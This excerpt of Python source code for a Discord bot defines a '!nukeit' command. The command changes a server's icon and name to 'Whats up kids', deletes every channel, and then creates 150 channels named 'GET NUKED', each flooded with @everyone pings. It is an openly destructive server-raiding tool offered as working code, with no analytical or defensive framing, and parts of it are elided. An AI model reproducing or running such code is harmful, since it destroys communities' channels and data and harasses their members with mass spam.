...
fobos = commands.Bot(command_prefix="!")
...
async def on_ready():
    ...
    await fobos.change_presence(status=discord.Status.idle, activity=activity)
    print("Bot Is Online!")

@fobos.command()
async def nukeit(ctx):
    x = 150
    guild = ctx.message.guild
    with open('logo.png', 'rb') as f:
        icon = f.read()
    await guild.edit(icon=icon)
    await ctx.guild.edit(name="Whats up kids")
    for c in ctx.guild.channels:
        await c.delete()
    for i in range(x):
        channel = await guild.create_text_channel('GET NUKED')
        await channel.send("@everyone" + f"{message}")
        await channel.send("@everyone" + f"{message}")
        await channel.send("@everyone" + f"{message}")
        await channel.send("@everyone" + f"{message}")
        await channel.send("@everyone" + f"{message}")
